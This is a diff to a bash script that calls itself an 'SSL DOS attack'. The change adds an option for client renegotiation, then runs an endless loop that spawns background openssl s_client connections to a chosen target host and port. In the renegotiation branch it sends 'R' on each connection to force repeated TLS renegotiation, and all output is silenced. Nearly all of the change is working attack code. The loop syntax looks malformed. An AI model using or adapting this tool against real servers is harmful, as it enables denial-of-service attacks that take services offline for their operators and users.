@@ -19,10 +19,30 @@ elif [ "$PORT" -gt "65535" ]; then
 	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
 else echo "Using PORT $PORT"
 fi
-echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
+	echo "Use client renegotiation? [y]es or [n]o (default):"
+read NEGOTIATE
+
+: ${NEGOTIATE:=n}
+
+if [[ $NEGOTIATE = y ]]; then
+	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
+while : for i in {1..10} 
+	do echo "spawning instance"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
+done
+
+elif [[ $NEGOTIATE = n ]]; then
+	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
 while : for i in {1..10} 
 	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
 done
+
+else 
+	echo "Invalid option, assuming no client renegotiation"
+	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
+while : for i in {1..10} 
+	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
+done
+fi
 }
 ## create listener function
 listener ()
